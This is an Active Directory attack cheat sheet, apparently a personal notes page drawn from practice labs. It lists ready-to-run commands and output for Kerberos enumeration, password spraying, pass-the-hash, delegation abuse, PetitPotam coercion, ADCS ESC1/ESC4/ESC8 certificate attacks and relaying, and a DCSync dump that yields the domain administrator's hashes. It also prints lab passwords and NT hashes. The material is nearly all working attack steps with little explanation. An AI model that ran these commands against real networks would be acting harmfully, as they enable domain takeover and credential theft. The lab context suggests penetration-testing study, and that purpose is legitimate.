+++
date = '2026-11-14T08:43:23+06:30'
title = 'Active Directory'
cover = '/images/covers/47.jpeg'
+++

## CheatScripts

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP \
  | grep ^[0-9] \
  | cut -d '/' -f 1 \
  | tr '\n' ',' \
  | sed 's/,$//')

nmap -p"$ports" -sC -sV $IP 
```

## Recon

Port 88 Kerberos

`kerbrute userenum -d shibuya.vl --dc 10.129.234.42 seclists/Usernames/xato-net-10-million-usernames.txt `

`netexec smb shibuya.vl -k -u red -p red --users` 

`netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --spider 'images$' --regex . `  | file listing with nxc

```bash
Configure Kerberos Authentication 

netexec smb lus2dc.lustrous2.vl --generate-krb5-file krb5.conf

sudo cp krb5.conf /etc/krb5.conf

echo 'Lustrous2024' | kinit thomas.myers
export KRB5CCNAME=/tmp/krb5cc_1001
ldapwhoami -Y GSSAPI -H ldap://LUS2DC.lustrous2.vl

curl -I --negotiate -u : http://lus2dc.lustrous2.vl
In FireFox
network.negotiate-auth.using-native-gsslib: true
network.negotiate-auth.trusted-uris: .lustrous2.vl

curl --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Download?
fileName=\\10.10.14.67\Share'
With Responder Using
sudo responder -I tun0 -v
``` 

Port 445 SMB

`netexec smb $IP --generate-hosts-file hosts && cat hosts | sudo tee -a /etc/hosts`

`netexec smb $IP_dcIP -u guest -p '' -> STATUS_NOT_SUPPORTED add '-k' flag` 

```text
- `KDC_ERR_CLIENT_REVOKED`: The account is revoked or disabled.
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: The requested Kerberos principal does not exist.

NTLM authentication is disabled
```

`netexec smb $dc_string -u $user -p $pass -k --generate-tgt $user`

`KRB5CCNAME=Rosie.Powell.ccache smbclient.py -k DC-JPQ225.cicada.vl -> needed for kerberoasting ` 

`smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50`

Port 2049 NFS Shares

`showmount -e 10.129.234.48 -> show somethings name /$name`

`sudo mount -t nfs -o rw $ip:/$name /mnt`

## Enumeration 

### bloodhound

`bloodhound-ce-python -u thomas.myers -no-pass -k -d lustrous2.vl -ns 10.129.242.166 --ldap-channel-binding -c All --zip` -> ldap binding bloodhound enumerate 


## Attacking 


### Dumps 

`secretsdump.py -sam SAM -security SECURITY -system SYSTEM local`

### Spray

`netexec smb shibuya.vl -u users -p users --no-bruteforce --continue-on-success -k`

`netexec smb shibuya.vl -u users -H 5d8c3d1a20bd63f60f469f6763ca0d50 --continue-on-success`

### authorized_keys

```bash
ssh-keygen -t ed25519 -f amra
mv amra.pub authorized_keys

ssh -i amra -D 1080 simon.watson@shibuya.vl -> -D for proxy chains socks5

.\runascs.exe -l 9 amra amra qwinsta -> checking connections

In Local Machine
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.79
socat -v TCP-LISTEN:135,fork,reuseaddr TCP:$target_ip:8888

.\RemotePotato0.exe -m 2 -r 10.10.14.67 -x 10.10.14.67 -p 8888 -s
1

ssh -D 1080 nigel.mills@shibuya.vl
```

### Ticket Impersonation

```bash
getST.py -self -impersonate ryan.davies -k 'LUSTROUS2.VL/ShareSvc:#1Service' -altservice HTTP/lus2dc.lustrous2.vl

export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
```


### ADCS Enumeration
`certipy find -target $dc_string -u $user@$domain.vl -p $password -k -vulnerable -stdout`

`proxychains -q certipy-ad find -u nigel.mills -p Sail2Boat3 -dc-ip 10.129.234.42 -dns-tcp -vulnerable -enabled -stdout` | using proxychains with socks5

## Privilege Escalation

AD ATTACK 
```bash
ForceChangePassword

nxc ldap DC.phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc -M change-password -o USER=WSILVA PASSWORD=whoami69

#---------------------------

AddAllowedToAct
netexec smb dc.phantom.vl -u wsilva -p whoami69
netexec ldap dc.phantom.vl -u wsilva -p whoami69 -M maq -> machineaccountquota: 0 so we attack rbcd
rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:whoami -dc-ip [$target_ip]
getTGT.py phantom.vl/wsilva:whoami69
describeTicket.py wsilva.ccache -> Tikcet Session Key: [take_key_from_that]
changepasswd.py -newhashes :[take_key_from_that] phantom/wsilva:whoami69@dc.phantom.vl
KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache -> we will get administrator hash so just use evil-winrm and pwn3d it 

#---------------------------
Generic Write
bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' set object N.Thompson servicePrincipalName -v 'http/anything'

impacket-GetUserSPNs -dc-ip 10.129.234.69 -request -request-user N.Thompson delegate.vl/A.Briggs:'P4ssw0rd1#123'
```

```bash
when getting service accoutn with [nt system\ local service] use [FullPowers.exe] to enabled other privilege
```

```bash
Delegation
findDelegation.py delegate.vl/N.Thompson:KALEB_2341 # finding delegation type

Unconstrain delegation attack
addcomputer.py -computer-name oxdf -computer-pass 0xdf0xdf. -dc-ip [target_ip] delegate.vl/N.Thompson:'KALEB_2341'
python dnstool.py -u 'delegate.vl\oxdf$' -p '0xdf0xdf.' --action add --record oxdf.delegate.vl --data [local_ip] --type A -dns-ip [target_ip] dc1.delegate.vl
python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/oxdf.delegate.vl' -t 'oxdf$' -dc-ip [target_ip] dc1.delegate.vl
bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION
python -c "password = '0xdf0xdf.'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
python krbrelayx.py -hashes :from_above_hash
netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus  -> to use krbrelayx find the vuln and attack
netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PetitPotam -> choosing PetitPotam Exploit
netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. --generate-krb5-file krb5.conf -> for dcsync setup
cat krb5.conf | sudo tee /etc/krb5.conf
KRB5CCNAME=[DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache_from_the_krbrelayxCache] netexec smb dc1.delegate.vl --use-kcache 
KRB5CCNAME=[DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache_from_the_krbrelayxCache] netexec smb dc1.delegate.vl --use-kcache --ntds -> got the administrator hash
#-----
```

### ECS1

```bash
proxychains -q certipy-ad req -u nigel.mills -p Sail2Boat3 -target-ip 10.129.234.42 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin -key-size 4096 -debug -sid S-1-5-21-87560095-894484815-3652015022-500

proxychains -q certipy-ad auth -pfx _admin.pfx -domain shibuya.vl -dc-ip 10.129.234.42

impacket-smbexec _admin@shibuya.vl -hashes :bab5b2a004eabb11d865f31912b6b430
```

```bash
Step By Step Exploit

proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 4
Would you like to save the private key? (y/N) 
[-] Failed to request certificate

#------------------------------------

proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'administrator@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

#--------------------------------------
Error With upn(user principal name) 
proxychains certipy auth -pfx administrator.pfx -dc-ip 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@shibuya.vl
[*] Trying to get TGT...
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

#---------------------------------------
Changing upn to _admin
proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to '_admin.pfx'

#----------------------------------------
Error with sid 
proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[-] Object SID mismatch between certificate and user '_admin'

#-----------------------------------------
Adding SID
proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saved certificate and private key to '_admin.pfx'
```

### ECS4

```bash
certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
[!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -no-save # [-template need to be change] after that we enabled ecs1 attack


certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
[!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.

certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500

certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 # [if this is not working use below]
certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl
```

### ECS8

```bash
netexec ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq

LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] Getting the MachineAccountQuota
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        MachineAccountQuota: 10
```

```bash
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.79
```

```bash
In Local Machine

certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```

```bash
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus 

SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
```

```bash
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```bash
In Previous Local Listener

certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController

Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 95
[*] Retrieving certificate for request ID: 95
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=95 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```

```bash
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

```bash
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator


[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up... 
```

```bash
wmiexec.py cicada.vl/administrator@dc-jpq225.cicada vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```